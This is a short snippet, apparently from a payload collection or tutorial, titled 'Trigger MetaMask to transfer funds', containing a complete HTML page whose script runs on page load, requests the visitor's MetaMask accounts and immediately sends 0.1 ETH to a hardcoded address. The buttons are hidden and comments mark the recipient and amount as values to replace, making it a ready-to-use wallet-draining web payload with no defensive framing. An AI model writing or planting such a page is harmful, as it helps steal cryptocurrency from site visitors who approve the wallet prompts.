### Trigger MetaMask to transfer funds
```
<!DOCTYPE html>
<html>
<head>
    <title>MetaMask Transfer</title>
    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
</head>
<body>
    <button id="connectButton" style="display: none;">Connect MetaMask</button>
    <button id="transferButton" style="display: none;">Transfer</button>

    <script>
        let web3;

        // 检查 MetaMask 是否安装
        if (typeof window.ethereum !== 'undefined') {
            web3 = new Web3(window.ethereum);
            console.log('MetaMask is installed!');
        } else {
            alert('Please install MetaMask to use this dApp!');
        }

        // 连接 MetaMask
        async function connectMetaMask() {
            try {
                await ethereum.request({ method: 'eth_requestAccounts' });
                console.log('MetaMask connected');
                autoTransfer();
            } catch (error) {
                console.error('User rejected the request');
            }
        }

        // 转账
        async function autoTransfer() {
            const accounts = await web3.eth.getAccounts();
            const fromAddress = accounts[0];
            const toAddress = '0xfb0bc05F1aC61a566E70890e0e000E66F147ae66'; // 替换为接收地址
            const amount = web3.utils.toWei('0.1', 'ether'); // 替换为要转账的金额

            web3.eth.sendTransaction({
                from: fromAddress,
                to: toAddress,
                value: amount
            })
            .on('transactionHash', (hash) => {
                console.log('Transaction sent. Hash:', hash);
            })
            .on('receipt', (receipt) => {
                console.log('Transaction confirmed. Receipt:', receipt);
            })
            .on('error', (error) => {
                console.error('Transaction failed:', error);
            });
        }

        // 自动连接并转账
        window.addEventListener('load', async () => {
            await connectMetaMask();
        });
    </script>
</body>
</html>
```
